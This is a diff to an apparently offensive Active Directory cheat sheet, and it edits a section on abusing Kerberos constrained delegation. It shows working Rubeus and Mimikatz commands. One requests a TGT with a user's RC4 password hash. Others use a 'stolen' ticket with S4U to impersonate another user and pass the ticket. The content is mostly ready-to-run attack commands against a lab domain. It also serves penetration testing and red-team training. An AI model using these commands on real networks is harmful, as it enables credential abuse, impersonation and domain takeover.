@@ -730,7 +730,8 @@ Or using ActiveDirectory module:
 * * *
 
 #### Requesting a (constrained delegation) TGT:
-
+Use ```/outfile:``` or ```/nowrap``` if copy pasting - 
+ 
 ```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /outfile:C:\Temp\webtgt.kirbi```
 
 #### Using S4U and the previous TGT, request a delegated TGS by specifying the msDS-AllowedToDelegateTo Service:
@@ -745,7 +746,7 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 
 #### Rubeus SFU - constrained delegation user 
 
-Rubeus (optional ```/domain``` ```/dc``` and ```/ptt``` or ```/nowrap``` if copy pasting):
+Rubeus (optional ```/domain``` ```/dc``` ; and ```/ptt```):
 
 ```
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt
